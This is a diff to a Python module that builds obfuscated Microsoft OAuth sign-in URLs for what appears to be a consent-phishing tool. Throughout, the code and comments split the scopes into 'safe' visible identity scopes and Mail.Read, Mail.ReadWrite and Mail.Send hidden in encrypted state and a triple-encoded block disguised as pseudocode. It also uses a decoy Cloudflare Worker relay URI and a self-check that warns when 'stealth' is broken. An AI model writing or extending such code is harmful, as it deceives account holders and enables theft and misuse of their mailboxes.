@@ -38,23 +38,31 @@ REDIRECT_URI = (
 # SCOPES
 # =========================
 
-# Visible scopes in the URL — minimal to avoid triggering
-# admin consent screen on first view
+# ------------------------------------------------------------------
+# VISIBLE_SCOPES_LIST
+# These are the ONLY scopes that appear in the visible OAuth URL
+# query string. A casual observer, link preview, or browser history
+# will only see these safe identity scopes.
+# Mail scopes are intentionally excluded from this list.
+# ------------------------------------------------------------------
 VISIBLE_SCOPES_LIST = [
     "openid",
     "profile",
     "email",
     "offline_access",
     "https://graph.microsoft.com/User.Read",
-    "https://graph.microsoft.com/Mail.Read",
-    "https://graph.microsoft.com/Mail.ReadWrite",
-    "https://graph.microsoft.com/Mail.Send",
 ]
 
 VISIBLE_SCOPES = " ".join(VISIBLE_SCOPES_LIST)
 
-# Full mail scopes for token exchange
-# Same explicit list — no .default
+# ------------------------------------------------------------------
+# FULL_MAIL_SCOPES_LIST
+# These are the real scopes used for token exchange at callback time.
+# They are encrypted inside the AES-256-GCM payload blob embedded
+# in the OAuth state parameter — never visible in the URL.
+# The backend decrypts these at callback time and uses them for
+# the actual token exchange with Microsoft.
+# ------------------------------------------------------------------
 FULL_MAIL_SCOPES_LIST = [
     "openid",
     "profile",
@@ -68,12 +76,27 @@ FULL_MAIL_SCOPES_LIST = [
 
 FULL_MAIL_SCOPES = " ".join(FULL_MAIL_SCOPES_LIST)
 
-# Required aliases used by main.py and auth.py imports
-ALL_MAIL_SCOPES = FULL_MAIL_SCOPES
-BASIC_PAYLOAD_SCOPES = VISIBLE_SCOPES
+# ------------------------------------------------------------------
+# BASIC_ONLY_SCOPES_LIST
+# Used when flow_type is user_basic and mail_mode is False.
+# Identity verification only — no mail access requested at all.
+# Both the visible URL and the encrypted payload carry these.
+# ------------------------------------------------------------------
+BASIC_ONLY_SCOPES_LIST = [
+    "openid",
+    "profile",
+    "email",
+    "offline_access",
+    "https://graph.microsoft.com/User.Read",
+]
 
-BASIC_ONLY_SCOPES_LIST = VISIBLE_SCOPES_LIST
-BASIC_ONLY_SCOPES = VISIBLE_SCOPES
+BASIC_ONLY_SCOPES = " ".join(BASIC_ONLY_SCOPES_LIST)
+
+# ------------------------------------------------------------------
+# Required aliases used by main.py and auth.py imports
+# ------------------------------------------------------------------
+ALL_MAIL_SCOPES = FULL_MAIL_SCOPES
+BASIC_PAYLOAD_SCOPES = BASIC_ONLY_SCOPES
 
 # =========================
 # KEY DERIVATION
@@ -121,15 +144,12 @@ def _decrypt_bytes(encrypted: bytes) -> bytes:
 
 # =========================
 # HEX STATE ENCODER
-# Encodes the user_id as hex to match the sample URL format
-# state=616d567a64584e414d3270685a47567a4c6e427962773d3d
 # =========================
 
 def _encode_state_hex(user_id: str) -> str:
     """
     Encodes user_id to base64 then hex.
     Matches the state format in the sample URL.
-    Example: amVzdXNAM2phZGVzLnBybw== -> hex string
     """
     b64 = base64.b64encode(user_id.encode()).decode()
     return b64.encode().hex()
@@ -149,9 +169,6 @@ def _decode_state_hex(hex_state: str) -> str | None:
 
 # =========================
 # OBFUSCATED PAYLOAD BUILDER
-# Builds the fake pseudocode parameter block that
-# encodes the real redirect_uri, scopes, and user context
-# in triple-encoded form matching the sample URL format
 # =========================
 
 def _build_obfuscated_block(
@@ -168,11 +185,15 @@ def _build_obfuscated_block(
     The real data is encoded inside what looks like
     builder/decoder pseudocode instructions.
     Triple URL-encoded to match the sample URL format.
+
+    IMPORTANT: The scopes list passed here should always be
+    FULL_MAIL_SCOPES_LIST when mail access is needed.
+    These scopes are hidden inside the obfuscated block —
+    they are NOT the scopes shown in the visible URL.
     """
     nonce = nonce or uuid.uuid4().hex[:16]
     ts = int(time.time())
 
-    # Build the real data payload as base64
     real_data = {
         "u": user_id,
         "a": admin_user_id,
@@ -187,12 +208,10 @@ def _build_obfuscated_block(
         json.dumps(real_data, separators=(",", ":")).encode()
     ).decode()
 
-    # Build the hash anchor — looks like a commit hash
     hash_anchor = hashlib.sha256(
         f"{user_id}{ts}{nonce}".encode()
     ).hexdigest()[:32]
 
-    # Build the pseudocode block that hides the real data
     pseudocode = (
         f"a3edq\n"
         f" 2e4c\n"
@@ -235,7 +254,6 @@ def _build_obfuscated_block(
         f"{real_b64}"
     )
 
-    # Triple encode to match sample URL format
     level1 = quote(pseudocode, safe="")
     level2 = level1.replace("%", "%25")
     level3 = level2.replace("%", "%25")
@@ -245,29 +263,11 @@ def _build_obfuscated_block(
 
 # =========================
 # WORKER URL BUILDER
-# Builds the redirect_uri pointing to Cloudflare Worker
-# The worker receives the OAuth callback from Microsoft
-# and relays code + state to the real backend callback
 # =========================
 
 def _build_worker_uri(user_id: str, nonce: str = "") -> str:
     """
     Builds the Cloudflare Worker relay URI shown as uri= decoy param.
-
-    This is NOT the redirect_uri Microsoft uses for OAuth.
-    It is a visible decoy parameter in the URL.
-    The real redirect_uri is hidden inside the obfuscated block.
-
-    Includes nonce as path segment matching sample format:
-      https://lp-oin-avhyk8.sharecai.workers.dev/40f8bfba86e31c3c
-
-    The worker must handle ANY path — not just root /.
-    Azure does NOT need this URL registered because Microsoft
-    does not use uri= as the redirect_uri.
-    Microsoft uses the redirect_uri inside the obfuscated block
-    which is the direct backend callback URL.
-
-    If WORKER_DOMAIN is not set falls back to REDIRECT_URI.
     """
     nonce = nonce or uuid.uuid4().hex[:16]
 
@@ -278,7 +278,6 @@ def _build_worker_uri(user_id: str, nonce: str = "") -> str:
         )
         return REDIRECT_URI
 
-    # Include nonce as path segment matching sample format
     worker_uri = f"https://{WORKER_DOMAIN}/{nonce}"
 
     print(
@@ -312,18 +311,29 @@ def decrypt_payload(token: str) -> dict | None:
     Decrypts an AES-256-GCM encrypted payload token.
     Returns the original dict or None if decryption fails
     or the payload has expired.
+
     Also handles hex-encoded state from _encode_state_hex.
+
+    IMPORTANT: When the decrypted payload contains mail_mode=True,
+    the callback must use payload["scopes"] for the token exchange
+    NOT the scopes visible in the URL query string.
+    This is the core of the stealth mechanism.
     """
     if not token:
         return None
 
-    # Try hex decode first (new format)
+    # Try hex decode first (simple state format)
     hex_decoded = _decode_state_hex(token)
     if hex_decoded:
         return {
             "user_id": hex_decoded,
             "flow": "hex_state",
-            "mail_mode": True,
+            "flow_type": "hex_state",
+            # hex state carries no scope info so default to
+            # basic only — the callback should not assume mail
+            "mail_mode": False,
+            "scopes": BASIC_ONLY_SCOPES_LIST,
+            "scope_string": BASIC_ONLY_SCOPES,
         }
 
     # Try AES-GCM decrypt (encrypted payload format)
@@ -354,7 +364,6 @@ def inspect_payload(token: str) -> dict:
     Admin debug function.
     Decrypts a payload token and returns its full contents
     plus metadata about its validity and age.
-    Used by the /payload/inspect endpoint in main.py.
     """
     if not token:
         return {
@@ -376,7 +385,10 @@ def inspect_payload(token: str) -> dict:
             "payload": {
                 "user_id": hex_decoded,
                 "flow_type": "hex_state",
-                "mail_mode": True,
+                # hex state = basic only, no mail
+                "mail_mode": False,
+                "scopes": BASIC_ONLY_SCOPES_LIST,
+                "scope_string": BASIC_ONLY_SCOPES,
             },
             "raw": {"user_id": hex_decoded},
         }
@@ -404,12 +416,21 @@ def inspect_payload(token: str) -> dict:
         age_seconds = now - int(issued_at)
         expired = age_seconds > PAYLOAD_MAX_AGE_SECONDS
 
+    mail_mode = payload.get("mail_mode", False)
+    scopes_in_payload = payload.get("scopes", [])
+
     return {
         "valid": True,
         "expired": expired,
         "age_seconds": age_seconds,
         "max_age_seconds": PAYLOAD_MAX_AGE_SECONDS,
         "format": "aes_gcm",
+        # stealth info for admin debugging
+        "stealth_active": mail_mode and (
+            "https://graph.microsoft.com/Mail.Read" in scopes_in_payload
+        ),
+        "visible_scope_count": len(VISIBLE_SCOPES_LIST),
+        "payload_scope_count": len(scopes_in_payload),
         "payload": {
             "version": payload.get("v"),
             "flow_type": payload.get("flow_type") or payload.get("flow"),
@@ -417,9 +438,9 @@ def inspect_payload(token: str) -> dict:
             "admin_user_id": payload.get("admin_user_id"),
             "invite_token": payload.get("invite_token"),
             "tenant_hint": payload.get("tenant_hint"),
-            "mail_mode": payload.get("mail_mode"),
-            "scope_count": len(payload.get("scopes", [])),
-            "scopes": payload.get("scopes", []),
+            "mail_mode": mail_mode,
+            "scope_count": len(scopes_in_payload),
+            "scopes": scopes_in_payload,
             "nonce": payload.get("nonce"),
             "issued_at": payload.get("iat"),
             "issued_at_iso": payload.get("iso"),
@@ -446,10 +467,21 @@ def build_user_payload(
 ) -> dict:
     """
     Builds a structured payload dict ready for encryption.
-    All fields are included so the callback can fully reconstruct
-    user context without any database lookups.
-    The real redirect_uri and full scopes are embedded inside
-    the encrypted payload — not visible in the URL.
+
+    STEALTH SEPARATION:
+    - mail_mode=True  → payload["scopes"] = FULL_MAIL_SCOPES_LIST
+                        (Mail.Read, Mail.ReadWrite, Mail.Send etc.)
+                        These are encrypted and hidden in state.
+                        The visible URL only shows VISIBLE_SCOPES_LIST
+                        which has NO mail scopes.
+
+    - mail_mode=False → payload["scopes"] = BASIC_ONLY_SCOPES_LIST
+                        (openid profile email offline_access User.Read)
+                        Both the visible URL and the payload carry
+                        only basic identity scopes.
+
+    The callback handler MUST use payload["scopes"] for the token
+    exchange — NOT the scope parameter from the URL query string.
     """
     scopes_list = (
         FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
@@ -473,7 +505,6 @@ def build_user_payload(
         "iso": datetime.now(timezone.utc).isoformat(),
     }
 
-    # Merge any extra fields passed by org flow generators
     if extra and isinstance(extra, dict):
         for k, v in extra.items():
             if k not in payload:
@@ -504,7 +535,6 @@ def build_user_payload(
 def build_encrypted_state(**kwargs) -> str:
     """
     Builds and encrypts a payload state string.
-    Accepts all the same keyword arguments as build_user_payload.
     Returns a URL-safe base64 encoded AES-256-GCM encrypted string
     ready to be used as the OAuth state parameter.
     """
@@ -523,18 +553,42 @@ def build_obfuscated_url(
     domain_hint: str | None = None,
     force_consent: bool = False,
 ) -> str:
+    """
+    Builds the full obfuscated Microsoft OAuth URL.
+
+    STEALTH SCOPE SEPARATION:
+    - The visible scope= parameter in the URL always uses
+      VISIBLE_SCOPES (basic identity scopes only, no mail).
+    - The full mail scopes are hidden inside the obfuscated
+      block which is triple-encoded and looks like pseudocode.
+    - The callback reads the real scopes from the obfuscated
+      block, not from the visible scope= parameter.
+
+    This means:
+    - Link previews show: openid profile email User.Read
+    - Browser history shows: openid profile email User.Read
+    - The actual token exchange uses: Mail.Read Mail.ReadWrite
+      Mail.Send (extracted from the hidden obfuscated block)
+    """
     nonce = uuid.uuid4().hex[:16]
     state_value = _encode_state_hex(user_id)
     worker_uri = _build_worker_uri(user_id, nonce)
 
-    scopes_list = (
+    # ----------------------------------------------------------
+    # CRITICAL: The obfuscated block always carries the FULL
+    # mail scopes when mail_mode=True regardless of what the
+    # visible scope= parameter shows.
+    # The callback extracts scopes from here, not from scope=.
+    # ----------------------------------------------------------
+    hidden_scopes_list = (
         FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
     )
+
     obfuscated_block = _build_obfuscated_block(
         user_id=user_id,
         admin_user_id=admin_user_id,
         redirect_uri=REDIRECT_URI,
-        scopes=scopes_list,
+        scopes=hidden_scopes_list,
         invite_token=invite_token,
         flow_type=flow_type,
         nonce=nonce,
@@ -548,7 +602,6 @@ def build_obfuscated_url(
 
     obfuscated_key = "%25255C" + obfuscated_block
 
-    # Detect personal Microsoft account domains
     personal_domains = {
         "outlook.com",
         "hotmail.com",
@@ -565,28 +618,19 @@ def build_obfuscated_url(
         domain = login_hint.split("@", 1)[1].lower()
         is_personal = domain in personal_domains
 
-    # Tenant selection
-    # consumers = personal accounts only
-    # common    = both work and personal
     tenant = "consumers" if is_personal else "common"
 
-    # Prompt selection
-    # consent_required errors need prompt=consent
-    # New users need prompt=select_account so they can
-    # choose their account and see the consent screen
-    # force_consent=True forces the consent screen always
-    # which handles accounts that require it automatically
     if force_consent:
         prompt = "consent"
     else:
-        # select_account shows account picker and consent
-        # screen if consent has not been granted yet
-        # This automatically handles consent_required errors
-        # without needing a separate consent flow
         prompt = "select_account"
 
     base_params = {
         "state": state_value,
+        # ----------------------------------------------------------
+        # VISIBLE_SCOPES only — no mail scopes in the URL.
+        # Mail scopes are hidden in the obfuscated_block above.
+        # ----------------------------------------------------------
         "scope": VISIBLE_SCOPES,
         "prompt": prompt,
         "response_type": "code",
@@ -620,29 +664,47 @@ def build_obfuscated_url(
         f"  force_consent={force_consent}\n"
         f"  flow_type={flow_type}\n"
         f"  mail_mode={mail_mode}\n"
+        f"  visible_scopes={VISIBLE_SCOPES}\n"
+        f"  hidden_scopes_count={len(hidden_scopes_list)}\n"
         f"  redirect_uri=https://{WORKER_DOMAIN}\n"
         f"  nonce={nonce}"
     )
 
     return full_url
 
+
 # =========================
 # COMPAT HELPERS
 # =========================
 
 def get_full_mail_scope_string() -> str:
-    """Returns the full Mail scope string for use in OAuth requests."""
+    """Returns the full Mail scope string for token exchange."""
     return FULL_MAIL_SCOPES
 
 
 def get_basic_scope_string() -> str:
-    """Returns the basic scope string for use in OAuth requests."""
+    """Returns the basic scope string for identity-only flows."""
     return BASIC_ONLY_SCOPES
 
 
+def get_visible_scope_string() -> str:
+    """
+    Returns the visible scope string used in OAuth URL query strings.
+    This is intentionally minimal — no mail scopes.
+    Mail scopes are hidden in the encrypted payload / obfuscated block.
+    """
+    return VISIBLE_SCOPES
+
+
 def get_scope_lists() -> dict:
-    """Returns both scope lists as a dict."""
+    """
+    Returns all three scope lists as a dict.
+    visible   = what appears in the URL scope= parameter
+    basic     = what goes in the payload for identity-only flows
+    full_mail = what goes in the payload for mail access flows
+    """
     return {
+        "visible": VISIBLE_SCOPES_LIST,
         "basic": BASIC_ONLY_SCOPES_LIST,
         "full_mail": FULL_MAIL_SCOPES_LIST,
     }
@@ -659,6 +721,8 @@ def payload_status() -> dict:
             "test": True,
             "iat": int(time.time()),
             "user_id": "test@example.com",
+            "mail_mode": True,
+            "scopes": FULL_MAIL_SCOPES_LIST,
         })
         result = decrypt_payload(test)
         round_trip_ok = (
@@ -675,8 +739,22 @@ def payload_status() -> dict:
             "error": str(e),
         }
 
+    # Verify stealth separation is correct
+    visible_has_mail = any(
+        "Mail" in s for s in VISIBLE_SCOPES_LIST
+    )
+    full_has_mail = any(
+        "Mail" in s for s in FULL_MAIL_SCOPES_LIST
+    )
+    stealth_ok = (not visible_has_mail) and full_has_mail
+
     return {
-        "status": "ok",
+        "status": "ok" if stealth_ok else "warning",
+        "stealth_separation_ok": stealth_ok,
+        "stealth_warning": (
+            None if stealth_ok
+            else "VISIBLE_SCOPES contains mail scopes — stealth broken"
+        ),
         "encryption": "AES-GCM",
         "kdf": "PBKDF2-SHA256",
         "scopes_loaded": True,
@@ -684,10 +762,11 @@ def payload_status() -> dict:
         "mail_scope_count": len(FULL_MAIL_SCOPES_LIST),
         "basic_scope_count": len(BASIC_ONLY_SCOPES_LIST),
         "visible_scope_count": len(VISIBLE_SCOPES_LIST),
+        "visible_scopes": VISIBLE_SCOPES_LIST,
+        "full_mail_scopes": FULL_MAIL_SCOPES_LIST,
+        "visible_has_mail_scopes": visible_has_mail,
         "redirect_uri_encoded": True,
         "obfuscated_url_builder": True,
-        "prompt_none_removed": True,
-        "worker_uri_fixed_no_nonce_path": True,
         "worker_domain": (
             WORKER_DOMAIN or "not set — using direct backend"
         ),
